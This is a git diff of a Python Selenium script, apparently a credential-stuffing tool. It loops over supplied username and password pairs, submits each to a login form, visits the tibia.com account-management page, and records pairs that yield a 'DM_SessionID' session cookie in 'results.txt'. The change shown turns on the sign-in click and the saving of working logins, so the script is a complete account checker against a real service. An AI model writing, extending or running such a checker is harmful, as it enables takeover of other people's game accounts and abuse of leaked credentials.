@@ -59,8 +59,19 @@ for credential in credentials:
     password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
     password.send_keys(passwordStr)
     current_url = browser.current_url
-    signInButton = WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.NAME, 'Login')))
- 
+    #signInButton = WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.NAME, 'Login')))
+    
+    signInButton = browser.find_element_by_class_name('ButtonText')
+    
     current_url = browser.current_url
+    
+    signInButton.click()
 
-    #signInButton.click()
+    cookie = browser.get_cookie('DM_SessionID')
+
+    browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
+
+    if cookie != None:
+        saveCredntialResultToFile(credential,"results.txt")
+    browser.quit()
+    
